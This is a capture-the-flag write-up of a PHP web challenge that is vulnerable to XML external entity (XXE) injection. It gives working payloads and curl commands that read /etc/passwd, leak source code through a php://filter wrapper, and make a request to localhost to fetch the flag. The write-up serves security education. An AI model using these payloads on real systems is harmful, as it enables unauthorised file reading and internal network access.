# Wrestler Name Generator
Web, 150 points

## Description

> Even better than the Wu-Tang name generator, legend has it that Hulk Hogan used this app to get his name.


## Solution

We visit the attaches site and see a form:

```html
<form>
  <div class="form-group">
    <label style="color:white" for="exampleFormControlInput1">First Name</label>
    <input type="email" class="form-control" id="firstName" placeholder="First">
  </div>
  <div class="form-group">
    <label style="color:white" for="exampleFormControlInput1">Last Name</label>
    <input type="email" class="form-control" id="lastName" placeholder="Last">
  </div>
  <div class="form-group">
    <label style="color:white" for="exampleFormControlSelect1">Weapon of Choice</label>
    <select class="form-control" id="weapon">
      <option>Steel Chair</option>
      <option>Flaming Table</option>
      <option>Barb Wire Bat</option>
      <option>Ladder</option>
      <option>Thumbtacks</option>
    </select>
  </div>
</form>
```

Submitting the form triggers the following script:

```html
<script>
document.getElementById("button").onclick = function() {
  var firstName = document.getElementById("firstName").value;
  var lastName = document.getElementById("lastName").value;
  var input = btoa("<?xml version='1.0' encoding='UTF-8'?><input><firstName>" + firstName + "</firstName><lastName>" + lastName+ "</lastName></input>");
  window.location.href = "/generate.php?input="+encodeURIComponent(input);
};
</script>
```

The form input is translated to XML. This method might be vulnerable to XXE.

> An XML External Entity attack is a type of attack against an application that parses XML input and allows XML entities. XML entities can be used to tell the XML parser to fetch specific content on the server.

Let's perform a simple proof of concept, taken from [PayloadsAllTheThings](https://github.[AWS_SECRET_REMOVED]e/master/XXE%20Injection).

We try to send the following XML:

```xml
<?xml version="1.0" ?>
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
<input>
    <firstName>John</firstName>
    <lastName>&example;</lastName>
</input>
```

If the service is vulnerable to XXE, the result will return as "John Doe".

```console
root@kali:/media/sf_CTFs/sunshine/Wrestler_Name_Generator# echo '<?xml version="1.0" ?><!DOCTYPE replace [<!ENTITY example "Doe"> ]><input><firstName>John</firstName><lastName>&example;</lastName></input>' | base64 -w 0 | curl -G "http://archive.sunshinectf.org:19007/generate.php" --data-urlencode "input=$(</dev/stdin)"
<!DOCTYPE html>
<html lang="en">
<head>
  <title>Wrestler Name Generator</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
</head>
<body>

<div class="jumbotron text-center">
  <h1>Your Wrestler Name Is:</h1>
  <h2>John "The Ferocious" Doe</h2>
<!--hacker name functionality coming soon!-->
<!--if you're trying to test the hacker name functionality, make sure you're accessing this page from the web server-->
<!--<h2>Your Hacker Name Is: REDACTED</h2>-->
  <a href="/">Go Back</a>
</div>
</body>
</html>
```

It worked!

Let's try reading a file from the server:
```console
root@kali:/media/sf_CTFs/sunshine/Wrestler_Name_Generator# cat << TEXT  | base64 -w 0 | curl -G "http://archive.sunshinectf.org:19007/generate.php" --data-urlencode "input=$(</dev/stdin)"
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
<input><firstName>John</firstName><lastName>&test;</lastName></input>
TEXT
<!DOCTYPE html>
<html lang="en">
<head>
  <title>Wrestler Name Generator</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
</head>
<body>

<div class="jumbotron text-center">
  <h1>Your Wrestler Name Is:</h1>
  <h2>John "The Slasher" root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/bin/false
</h2>
<!--hacker name functionality coming soon!-->
<!--if you're trying to test the hacker name functionality, make sure you're accessing this page from the web server-->
<!--<h2>Your Hacker Name Is: REDACTED</h2>-->
  <a href="/">Go Back</a>
</div>
</body>
</html>
```

Looks good, we are able to read files.

What happens if we enter bad input?
```console
root@kali:/media/sf_CTFs/sunshine/Wrestler_Name_Generator# cat << TEXT  | base64 -w 0 | curl -G "http://archive.sunshinectf.org:19007/generate.php" --data-urlencode "input=$(</dev/stdin)"
bad input
TEXT

<br />
<b>Warning</b>:  simplexml_load_string(): Entity: line 1: parser error : Start tag expected, '&lt;' not found in <b>/var/www/html/generate.php</b> on line <b>23</b><br />
<br />
<b>Warning</b>:  simplexml_load_string(): bad input in <b>/var/www/html/generate.php</b> on line <b>23</b><br />
<br />
<b>Warning</b>:  simplexml_load_string(): ^ in <b>/var/www/html/generate.php</b> on line <b>23</b><br />
Error parsing XML:
bad input
```

The server discloses the php file path - and we can try to read it:

```console
root@kali:/media/sf_CTFs/sunshine/Wrestler_Name_Generator# cat << TEXT  | base64 -w 0 | curl -G "http://archive.sunshinectf.org:19007/generate.php" --data-urlencode "input=$(</dev/stdin)"
<?xml version="1.0"?>
> <!DOCTYPE root [<!ENTITY test SYSTEM 'file:///var/www/html/generate.php'>]>
> <input><firstName>John</firstName><lastName>&test;</lastName></input>
> TEXT
<!DOCTYPE html>
<html lang="en">
<head>
  <title>Wrestler Name Generator</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
</head>
<body>

<div class="jumbotron text-center">
  <h1>Your Wrestler Name Is:</h1>
  <h2>John "The Brute"
</h2>
<!--hacker name functionality coming soon!-->
<!--if you're trying to test the hacker name functionality, make sure you're accessing this page from the web server-->
<!--<h2>Your Hacker Name Is: REDACTED</h2>-->
  <a href="/">Go Back</a>
</div>
</body>
</html>
```

This didn't work, but what if we try to base64 encode the file using PHP's filters?

```console
root@kali:/media/sf_CTFs/sunshine/Wrestler_Name_Generator# cat << TEXT  | base64 -w 0 | curl -G "http://archive.sunshinectf.org:19007/generate.php" --data-urlencode "input=$(</dev/stdin)"
<?xml version="1.0"?>
> <!DOCTYPE root [<!ENTITY test SYSTEM 'php://filter/convert.base64-encode/resource=/var/www/html/generate.php'>]>
> <input><firstName>John</firstName><lastName>&test;</lastName></input>
> TEXT
<!DOCTYPE html>
<html lang="en">
<head>
  <title>Wrestler Name Generator</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
</head>
<body>

<div class="jumbotron text-center">
  <h1>Your Wrestler Name Is:</h1>
  <h2>John "The Hacker" [AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED]CjwvYm9keT4KPC9odG1sPgpFT1Q7Cj8+Cg==</h2>
<!--hacker name functionality coming soon!-->
<!--if you're trying to test the hacker name functionality, make sure you're accessing this page from the web server-->
<!--<h2>Your Hacker Name Is: REDACTED</h2>-->
  <a href="/">Go Back</a>
</div>
</body>
</html>
```

That's more like it. The decoded text is:

```php
<?php

$whitelist = array(
    '127.0.0.1',
    '::1'
);
// if this page is accessed from the web server, the flag is returned
// flag is in env variable to avoid people using XXE to read the flag
// REMOTE_ADDR field is able to be spoofed (unless you already are on the server)
if(in_array($_SERVER['REMOTE_ADDR'], $whitelist)){
	echo $_ENV["FLAG"];
	return;
}
// make sure the input parameter exists
if (empty($_GET["input"])) {
	echo "Please include the 'input' get parameter with your request, Brother";
	return;
}

// get input
$xmlData = base64_decode($_GET["input"]);
// parse xml
$xml=simplexml_load_string($xmlData, null, LIBXML_NOENT) or die("Error parsing XML: "."\n".$xmlData);
$firstName = $xml->firstName;
$lastName = $xml-
```

Good enough to point us in the right direction - we just have to access the page from within the server.
In retrospective - This should have been clear from the comment in the HTML file:
```html
<!--if you're trying to test the hacker name functionality, make sure you're accessing this page from the web server-->
```

Anyway, here's how to do it:

```console
root@kali:/media/sf_CTFs/sunshine/Wrestler_Name_Generator# cat << TEXT  | base64 -w 0 | curl -G "http://archive.sunshinectf.org:19007/generate.php" --data-urlencode "input=$(</dev/stdin)"
<?xml version="1.0"?>
> <!DOCTYPE root [<!ENTITY test SYSTEM 'http://127.0.0.1/generate.php'>]>
> <input><firstName>John</firstName><lastName>&test;</lastName></input>
> TEXT
<!DOCTYPE html>
<html lang="en">
<head>
  <title>Wrestler Name Generator</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
</head>
<body>

<div class="jumbotron text-center">
  <h1>Your Wrestler Name Is:</h1>
  <h2>John "The Coder" sun{1_l0v3_hulk_7h3_3x73rn4l_3n717y_h064n}</h2>
<!--hacker name functionality coming soon!-->
<!--if you're trying to test the hacker name functionality, make sure you're accessing this page from the web server-->
<!--<h2>Your Hacker Name Is: REDACTED</h2>-->
  <a href="/">Go Back</a>
</div>
</body>
</html>
```

The flag: sun{1_l0v3_hulk_7h3_3x73rn4l_3n717y_h064n}